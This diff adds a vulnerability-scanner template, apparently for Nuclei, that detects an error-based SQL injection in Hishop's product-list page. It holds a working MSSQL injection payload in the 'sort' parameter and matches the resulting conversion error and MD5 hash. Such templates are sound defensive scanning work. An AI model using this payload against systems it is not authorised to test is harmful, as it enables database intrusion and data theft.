@@ -1,0 +1,29 @@
+id: hishop-productlist-sqli
+info:
+  name: Hishop ProductList SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects a SQL Injection vulnerability in the Hishop ProductList component.
+    The injection is based on MD5 hash calculations and error-based responses.
+
+variables:
+  t1: '{{rand_int(1000, 10000)}}'
+  t2: '{{md5(t1)}}'
+
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/wapshop/productlist.aspx?sort=char(sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27{{t1}}%27)))'
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "在将 nvarchar 值"
+          - "转换成数据类型 int 时失败"
+          - "{{t2}}"
+        part: body
+      - type: status
+        status:
+          - 200
